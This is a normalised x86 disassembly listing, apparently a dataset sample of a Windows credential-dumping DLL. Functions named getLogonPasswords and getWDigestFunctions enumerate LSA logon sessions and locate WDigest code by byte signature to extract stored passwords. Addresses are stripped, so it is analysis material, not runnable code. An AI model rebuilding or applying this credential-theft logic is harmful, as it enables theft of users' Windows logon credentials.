call sub_100173b1
add esp 0x4
mov ecx [ esp + 0x6c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov edi [ esp + 0x24 ]
mov eax ebx
call sub_10013c60
push ebx
call sub_100173b1
mov al [ esp + 0x17 ]
add esp 0x4
getWDigestFunctions
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x9c
push ebx
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
call sub_1000d200
call sub_100146e0
test al al
mov eax r--data
jne r-xdata
push eax
push ecx
lea ecx [ esp + 0x18 ]
push r--data
push ecx
call sub_100076f0
add esp 0xc
push eax
call sub_100076f0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov bl 0x6
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ rw-data ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000ceb0
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
call sub_100033b0
or eax 0x4
sub esp 0x1c
mov esi esp
lea eax [ esp + 0x2c ]
mov [ esp + 0x28 ] esp
call sub_1000d2e0
mov ecx [ ebp + 0x8 ]
call sub_10001850
mov edx [ esp + 0x2c ]
mov bl al
mov eax [ edx + 0x4 ]
add esp 0x1c
lea ecx [ esp + 0x14 ]
mov [ esp + eax + 0x10 ] r--data
call sub_10003fa0
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x4 ]
lea eax [ esp + 0x60 ]
mov [ esp + edx + 0x10 ] r--data
push eax
mov [ esp + 0x64 ] r--data
call sub_10015fc5
add esp 0x4
pop edi
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
call sub_100033b0
or eax 0x4
sub_10014b80
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10029513
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xf0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x108 ]
mov [ fs : 0x0 ] eax
call sub_100146e0
test al al
je r-xdata
sub esp 0x1c
mov ecx esp
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ esp + 0x2c ] esp
mov [ ecx ] ax
push 0x11
mov eax r--data
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ ecx ]
cmp eax ecx
je r-xdata
call sub_10001f10
mov ecx [ ebp + 0xc ]
call sub_10001850
add esp 0x1c
jmp r-xdata
sub esp 0x1c
mov ecx esp
xor edx edx
mov [ esp + 0x2c ] esp
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] dx
push 0xe
mov eax r--data
mov edx [ ebp + 0x8 ]
mov esi [ edx + 0x4 ]
nop
mov ecx [ esp + 0x108 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xf0 ]
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn 0xc
mov eax [ eax ]
cmp eax ecx
jne r-xdata
mov edi [ eax + 0x10 ]
cmp edi [ edx ]
je r-xdata
cmp [ eax + 0x14 ] esi
jne r-xdata
mov esi [ rw-data ]
add esi eax
lea edx [ esp + 0xe4 ]
lea edi [ esi + 0x10 ]
push edx
call sub_10015030
add esp 0x4
xor ebx ebx
mov [ esp + 0x110 ] ebx
cmp [ ebp + 0x10 ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ esi + 0x4 ]
shr ecx 0x1
xor edx edx
push ecx
mov edi 0x7
lea ecx [ esp + 0xcc ]
mov [ esp + 0xe0 ] edi
mov [ esp + 0xdc ] ebx
mov [ esp + 0xcc ] dx
call sub_10001f10
mov [ esp + 0x110 ] 0x1
movzx ecx [ esi + 0x8 ]
mov eax [ esi + 0xc ]
shr ecx 0x1
xor edx edx
push ecx
lea ecx [ esp + 0xb0 ]
mov [ esp + 0xc4 ] edi
mov [ esp + 0xc0 ] ebx
mov [ esp + 0xb0 ] dx
call sub_10001f10
lea eax [ esp + 0x14 ]
push eax
mov [ esp + 0x114 ] 0x2
call sub_1000d200
push 0xa
lea ecx [ esp + 0x18 ]
mov [ esp + 0x114 ] 0x3
call sub_1000d080
mov ecx [ esp + 0x14 ]
mov eax [ ecx + 0x4 ]
mov ecx [ esp + eax + 0x20 ]
xor esi esi
test cl 0x6
jne r-xdata
sub esp 0x1c
mov edi esp
mov [ esp + 0x2c ] esp
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
push ebx
lea ecx [ esp + 0x104 ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_10001db0
mov ecx [ ebp + 0xc ]
call sub_10001850
add esp 0x1c
mov bl al
mov esi 0x8
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov ecx [ ecx + 0x4 ]
lea ecx [ esp + ecx + 0x14 ]
cmp esi ebx
je r-xdata
mov eax [ esp + eax + 0x4c ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
cmp [ esp + 0xf8 ] esi
jb r-xdata
lea edx [ esp + 0xc8 ]
push edx
push ecx
lea eax [ esp + 0x1c ]
push r--data
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
mov al bl
mov eax [ esp + 0xe4 ]
push eax
call sub_100173b1
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
lea edx [ esp + 0xac ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
lea edx [ esp + 0xe4 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
sub esp 0x14
mov esi esp
lea eax [ esp + 0x30 ]
mov [ esp + 0x2c ] esp
call sub_1000d2e0
mov ecx [ ebp + 0xc ]
call sub_10001850
add esp 0x1c
lea ecx [ esp + 0x14 ]
mov bl al
mov [ esp + 0x110 ] 0x2
call sub_10008a40
mov esi 0x8
cmp [ esp + 0xc0 ] esi
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor ecx ecx
mov [ esp + 0xc0 ] 0x7
mov [ esp + 0xbc ] 0x0
mov [ esp + 0xac ] cx
cmp [ esp + 0xdc ] esi
jb r-xdata
mov eax [ esp + 0xac ]
push eax
call sub_100173b1
add esp 0x4
push ebx
call sub_100033b0
or eax 0x4
mov edx [ esp + 0xc8 ]
push edx
call sub_100173b1
add esp 0x4
sub_10014f80
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
mov [ ebp - 0x14 ] 0x8b55ff8b
mov [ ebp - 0x10 ] 0xff006aec
mov [ ebp - 0xc ] 0x75ff0c75
mov [ ebp - 0x8 ] 0xe808
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
cmp [ rw-data ] eax
setne al
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
push 0xc
lea ecx [ ebp - 0x24 ]
push ecx
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ GetModuleInformation@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x20 ]
push edi
push 0x1
lea edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x24 ]
add ecx eax
push ecx
push eax
mov edi 0xe
mov [ ebp - 0x18 ] 0x0
call sub_10002ba0
add esp 0x14
pop edi
test al al
je r-xdata
mov edx [ ebp - 0x18 ]
mov [ rw-data ] edx
sub_10015030
push ebp
mov ebp esp
push 0xffffffff
push sub_10028bf9
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] ax
push ebx
mov eax r--data
mov ecx esi
call sub_10001f10
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
cmp [ edi ] bx
jbe r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ edi + 0x2 ]
push ecx
call sub_10015dba
movzx edx [ edi + 0x2 ]
mov ebx eax
mov eax [ edi + 0x4 ]
push edx
push eax
push ebx
call sub_100183c0
movzx ecx [ edi + 0x2 ]
add esp 0x10
push ecx
push ebx
call [ rw-data ]
movzx edx [ edi ]
shr edx 0x1
push edx
mov eax ebx
mov ecx esi
call sub_10001f10
push ebx
call sub_1001748d
add esp 0x4
getLogonPasswords
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
xor esi esi
push r--data
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] ecx
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] esi
mov [ esp + 0x24 ] esi
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
xor edx edx
push 0x6
mov eax r--data
lea ecx [ esp + 0x34 ]
mov [ esp + 0x18 ] sub_1000e650
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x44 ] esi
mov [ esp + 0x34 ] dx
call sub_10001f10
lea edi [ esp + 0x30 ]
lea ecx [ esp + 0x14 ]
lea ebx [ esp + 0x4c ]
call sub_10013880
mov ecx eax
lea ebx [ esp + 0x18 ]
call sub_10010120
mov edi 0x8
cmp [ esp + 0x64 ] edi
jb r-xdata
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ esp + 0x30 ] ax
push 0x7
mov eax r--data
lea ecx [ esp + 0x34 ]
mov [ esp + 0x18 ] sub_10014b80
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x44 ] esi
call sub_10001f10
lea edi [ esp + 0x30 ]
lea ecx [ esp + 0x14 ]
lea ebx [ esp + 0x4c ]
call sub_10013880
mov ecx eax
lea ebx [ esp + 0x18 ]
call sub_10010120
mov edi 0x8
cmp [ esp + 0x64 ] edi
jb r-xdata
xor ecx ecx
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] esi
mov [ esp + 0x50 ] cx
cmp [ esp + 0x44 ] edi
jb r-xdata
mov eax [ esp + 0x50 ]
push eax
call sub_100173b1
add esp 0x4
mov edx [ esp + 0x2c ]
push edx
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x1c ]
call sub_10015330
mov ebx [ esp + 0x1c ]
add esp 0x4
mov [ esp + 0x13 ] al
cmp ebx esi
je r-xdata
xor ecx ecx
mov [ esp + 0x30 ] cx
push 0x5
mov eax r--data
lea ecx [ esp + 0x34 ]
mov [ esp + 0x18 ] sub_10014320
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x44 ] esi
call sub_10001f10
lea edi [ esp + 0x30 ]
lea ecx [ esp + 0x14 ]
lea ebx [ esp + 0x4c ]
call sub_10013880
mov ecx eax
lea ebx [ esp + 0x18 ]
call sub_10010120
mov edi 0x8
cmp [ esp + 0x64 ] edi
jb r-xdata
xor edx edx
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] esi
mov [ esp + 0x50 ] dx
cmp [ esp + 0x44 ] edi
jb r-xdata
mov ecx [ esp + 0x50 ]
push ecx
call sub_100173b1
add esp 0x4
mov edx [ esp + 0x30 ]
push edx
call sub_100173b1
add esp 0x4
mov ecx [ esp + 0x6c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10016ec3
mov esp ebp
pop ebp
retn
mov edi [ esp + 0x1c ]
mov eax ebx
call sub_10013c60
push ebx
call sub_100173b1
mov al [ esp + 0x17 ]
add esp 0x4
xor eax eax
mov [ esp + 0x64 ] 0x7
mov [ esp + 0x60 ] esi
mov [ esp + 0x50 ] ax
cmp [ esp + 0x44 ] edi
jb r-xdata
mov edx [ esp + 0x50 ]
push edx
call sub_100173b1
add esp 0x4
mov eax [ esp + 0x30 ]
push eax
call sub_100173b1
add esp 0x4
mov ecx [ esp + 0x30 ]
push ecx
call sub_100173b1
add esp 0x4
sub_10015330
push ebp
mov ebp esp
push 0xffffffff
push sub_100294c6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi edx
lea edx [ ebp - 0x78 ]
mov [ ebp - 0x94 ] eax
push edx
lea eax [ ebp - 0x8c ]
push eax
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x88 ] ecx
mov [ ebp - 0x69 ] 0x1
call [ LsaEnumerateLogonSessions@IAT ]
test eax eax
js r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x84 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push 0x36
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx esi
call sub_10001850
add esp 0x1c
xor ebx ebx
xor edi edi
mov [ ebp - 0x7c ] edi
cmp [ ebp - 0x8c ] ebx
jbe r-xdata
mov eax [ ebp - 0x78 ]
push eax
call [ LsaFreeReturnBuffer@IAT ]
mov al [ ebp - 0x69 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10016ec3
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x69 ] 0x0
je r-xdata
mov edx [ ebp - 0x78 ]
lea ecx [ ebp - 0x74 ]
push ecx
lea eax [ edx + edi * 8 ]
push eax
mov [ ebp - 0x74 ] ebx
call [ LsaGetLogonSessionData@IAT ]
xor edx edx
test eax eax
js r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x84 ] esp
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push 0x35
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx esi
call sub_10001850
add esp 0x1c
mov [ ebp - 0x69 ] al
jmp r-xdata
mov eax [ ebp - 0x74 ]
movzx ecx [ eax + 0xc ]
mov eax [ eax + 0x10 ]
shr ecx 0x1
push ecx
mov esi 0x7
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] dx
call sub_10001f10
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x74 ]
movzx ecx [ eax + 0x1c ]
mov eax [ eax + 0x20 ]
shr ecx 0x1
xor edx edx
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] dx
call sub_10001f10
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x74 ]
movzx ecx [ eax + 0x14 ]
mov eax [ eax + 0x18 ]
shr ecx 0x1
xor edx edx
push ecx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] dx
call sub_10001f10
lea eax [ ebp - 0x134 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1000d200
push 0xa
lea ecx [ ebp - 0x134 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000d080
mov ecx [ ebp - 0x134 ]
mov eax [ ecx + 0x4 ]
xor esi esi
test [ ebp + eax - 0x128 ] 0x6
jne r-xdata
inc edi
mov [ ebp - 0x7c ] edi
cmp edi [ ebp - 0x8c ]
jb r-xdata
mov ecx [ ebp - 0x134 ]
mov ecx [ ecx + 0x4 ]
lea ecx [ ebp + ecx - 0x134 ]
cmp esi ebx
je r-xdata
mov eax [ ebp + eax - 0xfc ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x80 ]
mov eax [ ebp - 0x78 ]
mov edx [ eax + edi * 8 ]
mov eax [ eax + edi * 8 + 0x4 ]
push edx
push ecx
push r--data
push ecx
push eax
push ecx
lea ecx [ ebp - 0x134 ]
push r--data
push ecx
call sub_100076f0
add esp 0xc
push eax
call sub_10015b10
add esp 0x4
push eax
call sub_100076f0
add esp 0xc
push eax
call sub_10005690
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax esi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov esi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
lea edx [ ebp - 0x4c ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
lea edx [ ebp - 0x68 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
lea edx [ ebp - 0x30 ]
push edx
push ecx
push r--data
push esi
call sub_100076f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_1000d080
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_100033b0
or eax 0x4
sub esp 0x1c
mov esi esp
lea eax [ ebp - 0x134 ]
mov [ ebp - 0x70 ] esp
call sub_1000d2e0
mov ecx [ ebp - 0x80 ]
call sub_10001850
mov [ ebp - 0x69 ] al
mov eax [ ebp - 0x88 ]
mov edi [ eax ]
add esp 0x1c
cmp edi [ eax + 0x4 ]
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov edx [ ebp - 0x74 ]
push edx
call [ LsaFreeReturnBuffer@IAT ]
mov ecx [ ebp - 0x134 ]
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0xe4 ]
mov [ ebp - 0x84 ] eax
mov [ ebp + edx - 0x134 ] r--data
test [ ebp - 0xf0 ] 0x1
lea eax [ ebp - 0x130 ]
mov [ ebp - 0x9c ] eax
mov [ ebp - 0x130 ] r--data
je r-xdata
lea edx [ ebp - 0x17c ]
lea eax [ ebp - 0x1c8 ]
mov [ ebp - 0x9c ] edx
mov [ ebp - 0x84 ] eax
jmp r-xdata
push ebx
call sub_100033b0
or eax 0x4
mov edx [ ebp - 0x120 ]
mov [ edx ] ebx
mov eax [ ebp - 0x110 ]
mov [ eax ] ebx
mov ecx [ ebp - 0x100 ]
mov [ ecx ] ebx
mov edx [ ebp - 0x11c ]
mov [ edx ] ebx
mov eax [ ebp - 0x10c ]
mov [ eax ] ebx
mov ecx [ ebp - 0xfc ]
mov [ ecx ] ebx
and [ ebp - 0xf0 ] 0xfffffffe
mov [ ebp - 0xf4 ] ebx
mov [ ebp - 0x130 ] r--data
mov [ ebp - 0x4 ] 0x8
mov eax [ ebp - 0xf8 ]
mov [ ebp - 0x70 ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x120 ]
mov eax [ ecx ]
push eax
call sub_100173b1
add esp 0x4
lea ecx [ ebp - 0x1cc ]
push ecx
call sub_1000d200
push r--data
push ecx
lea edx [ edi + 0x4 ]
push edx
push ecx
lea eax [ ebp - 0x1cc ]
push 0x9
push eax
mov [ ebp - 0x4 ] 0x4
call sub_100079f0
add esp 0xc
push eax
call sub_1000d3a0
add esp 0xc
push eax
call sub_100076f0
sub esp 0x14
mov esi esp
lea eax [ ebp - 0x1cc ]
mov [ ebp - 0x70 ] esp
call sub_1000d2e0
mov esi [ ebp - 0x80 ]
mov ecx esi
call sub_10001850
mov eax [ ebp - 0x94 ]
mov ecx [ eax ]
add esp 0x1c
cmp ecx [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
sete dl
movzx eax dl
mov edx [ ebp - 0x7c ]
push eax
lea eax [ ecx + edx * 8 ]
mov ecx [ edi ]
push esi
push eax
call ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x70 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push 0x1
mov eax r--data
mov [ ecx ] dx
call sub_10001f10
mov ecx esi
call sub_10001850
mov [ ebp - 0x69 ] al
mov eax [ ebp - 0x1cc ]
mov ecx [ eax + 0x4 ]
add esp 0x1c
mov [ ebp + ecx - 0x1cc ] r--data
test [ ebp - 0x188 ] 0x1
mov [ ebp - 0x1c8 ] r--data
je r-xdata
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x7
call sub_10016412
mov [ ebp - 0x4 ] 0x2
mov edx [ ebp - 0x134 ]
mov eax [ edx + 0x4 ]
lea ecx [ ebp - 0xe4 ]
mov [ ebp + eax - 0x134 ] r--data
push ecx
mov [ ebp - 0xe4 ] r--data
call sub_10015fc5
mov esi 0x8
add esp 0x4
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov edi [ eax ]
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov [ eax ] ebx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] ebx
mov edx [ ebp - 0x198 ]
mov [ edx ] ebx
mov eax [ ebp - 0x1b4 ]
mov [ eax ] ebx
mov ecx [ ebp - 0x1a4 ]
mov [ ecx ] ebx
mov edx [ ebp - 0x194 ]
mov [ edx ] ebx
and [ ebp - 0x188 ] 0xfffffffe
mov [ ebp - 0x18c ] ebx
mov [ ebp - 0x1c8 ] r--data
mov [ ebp - 0x4 ] 0x6
mov eax [ ebp - 0x190 ]
mov [ ebp - 0x70 ] eax
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x1b8 ]
mov eax [ edx ]
push eax
call sub_100173b1
add esp 0x4
xor eax eax
mov edi 0x7
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] ax
cmp [ ebp - 0x38 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_100173b1
add esp 0x4
mov ecx [ ebp - 0x70 ]
push ecx
call sub_100173b1
add esp 0x4
push ebx
lea ecx [ ebp - 0x98 ]
call sub_100163b9
mov eax [ edi + 0x4 ]
cmp eax ebx
jbe r-xdata
lea ecx [ ebp - 0x1c4 ]
mov [ ebp - 0x4 ] 0x5
call sub_10016412
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x1cc ]
mov edx [ ecx + 0x4 ]
lea eax [ ebp - 0x17c ]
mov [ ebp + edx - 0x1cc ] r--data
push eax
mov [ ebp - 0x17c ] r--data
call sub_10015fc5
mov ecx [ ebp - 0x88 ]
add edi 0x20
add esp 0x4
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov ebx [ eax ]
test ebx ebx
je r-xdata
xor edx edx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x4c ] dx
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_100173b1
add esp 0x4
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x98 ]
and esi edi
call sub_100163e1
cmp esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax [ ebp - 0x70 ]
push eax
call sub_100173b1
add esp 0x4
xor ebx ebx
push 0x0
lea ecx [ ebp - 0x90 ]
call sub_100163b9
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
